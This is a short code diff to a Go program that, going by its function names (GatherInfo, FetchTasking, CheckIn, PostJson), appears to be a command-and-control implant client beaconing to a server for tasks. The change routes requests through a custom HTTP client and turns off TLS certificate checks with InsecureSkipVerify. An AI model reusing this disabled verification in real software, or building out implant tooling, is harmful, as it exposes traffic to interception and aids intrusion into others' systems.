@@ -2,6 +2,7 @@ package main
 
 import (
 	crand "crypto/rand"
+	"crypto/tls"
 	"encoding/hex"
 	"fmt"
 	"io"
@@ -54,7 +55,7 @@ func GatherInfo() InitialInfo {
 func FetchTasking(serverAddr string, session string) (string, error) {
 	url := fmt.Sprintf("%s/tasks/%s", serverAddr, session)
 
-	resp, err := http.Get(url)
+	resp, err := customClient.Get(url)
 	if err != nil {
 		return "", err
 	}
@@ -63,8 +64,7 @@ func FetchTasking(serverAddr string, session string) (string, error) {
 	if err != nil {
 		return "", err
 	}
-	bodyString := string(bodyBytes)
-	return bodyString, nil
+	return string(bodyBytes), nil
 }
 
 func CheckIn(serverAddr string, session string) (int, error) {
@@ -76,6 +76,11 @@ func CheckIn(serverAddr string, session string) (int, error) {
 		CheckRedirect: func(req *http.Request, via []*http.Request) error {
 			return http.ErrUseLastResponse
 		},
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+			DisableKeepAlives: true,
+		},
+		Timeout: 10 * time.Second,
 	}
 
 	resp, err := client.Get(url)
@@ -104,7 +109,13 @@ func PostJson(url string, payload interface{}) (int, error) {
 	if err != nil {
 		return 0, err
 	}
-	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
+	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
+	if err != nil {
+		return 0, err
+	}
+	req.Header.Set("Content-Type", "application/json")
+	resp, err := customClient.Do(req)
+
 	if err != nil {
 		return 0, err
 	}
